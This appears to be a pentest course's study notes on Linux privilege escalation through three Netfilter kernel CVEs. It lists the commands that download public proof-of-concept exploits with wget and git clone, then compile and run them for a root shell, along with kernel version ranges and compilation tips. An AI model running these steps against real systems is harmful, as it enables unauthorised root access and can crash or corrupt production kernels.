## ID
533

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 26 — Netfilter

## Description
Theory section covering three Netfilter kernel vulnerabilities (CVE-2021-22555, CVE-2022-25636, CVE-2023-32233) that exploit packet filtering subsystem flaws for privilege escalation across a wide range of kernel versions.

## Tags
netfilter, kernel, cve-2021-22555, cve-2022-25636, cve-2023-32233, privilege-escalation

## Commands
- `uname -r`
- `wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c`
- `gcc -m32 -static exploit.c -o exploit`
- `git clone https://github.com/Bonfee/CVE-2022-25636.git`
- `git clone https://github.com/Liuk3r/CVE-2023-32233`
- `gcc -Wall -o exploit exploit.c -lmnl -lnftnl`

## What This Section Covers
Netfilter is the Linux kernel module responsible for packet filtering, NAT, and firewall functionality (iptables/arptables sit on top of it). Because it's deeply embedded in the kernel, vulnerabilities here lead directly to root. Three CVEs are covered: CVE-2021-22555 (out-of-bounds write, kernels 2.6–5.11), CVE-2022-25636 (heap OOB write in nf_dup_netdev.c, kernels 5.4–5.6.10), and CVE-2023-32233 (Use-After-Free in nf_tables anonymous sets, kernels up to 6.3.1). Many production environments run outdated kernels because upgrading breaks tightly coupled applications, making these CVEs highly relevant.

## Methodology
1. Check kernel version with `uname -r` to determine which CVE applies.
2. **CVE-2021-22555** (kernels 2.6–5.11): Download the PoC from Google Security Research, compile with `gcc -m32 -static exploit.c -o exploit`, and run `./exploit`.
3. **CVE-2022-25636** (kernels 5.4–5.6.10): Clone the PoC repo, `make`, and run `./exploit`. Caution: this can corrupt the kernel and require a reboot.
4. **CVE-2023-32233** (kernels up to 6.3.1): Clone the PoC, compile with `gcc -Wall -o exploit exploit.c -lmnl -lnftnl` (requires `libmnl` and `libnftnl` libraries), and run `./exploit`.
5. All three yield a root shell on success.

## Key Takeaways
- Netfilter CVEs cover a massive kernel range: from 2.6 all the way to 6.3.1 across the three vulnerabilities — always cross-reference `uname -r` against known Netfilter CVEs.
- These are kernel exploits, meaning they're inherently unstable and can crash or corrupt the system — on a real engagement, warn the client and get explicit approval before running them.
- CVE-2022-25636 is especially dangerous: it can corrupt the kernel and force a reboot, potentially causing a denial-of-service on production systems.
- Many enterprises can't upgrade kernels because their applications are tightly coupled to specific versions — this is why kernel privesc exploits remain viable years after disclosure.
- CVE-2021-22555 requires 32-bit compilation (`gcc -m32 -static`), so `gcc-multilib` must be available on the target or the binary must be cross-compiled.
- CVE-2023-32233 requires `libmnl` and `libnftnl` libraries for compilation — if they're missing on the target, compile externally on a matching system.

## Gotchas
- All three exploits can destabilize the kernel — never run on production without client approval and always have a recovery plan.
- CVE-2021-22555 needs 32-bit support (`gcc -m32`); if the target lacks `gcc-multilib`, the compile will fail — cross-compile and transfer the static binary instead.
- CVE-2023-32233 has library dependencies (`-lmnl -lnftnl`) that are uncommon on minimal installs — check with `dpkg -l | grep -E 'libmnl|libnftnl'` before attempting compilation.
- The kernel version ranges overlap between CVEs, so multiple exploits may apply to a single target — pick the most stable one for the specific kernel.
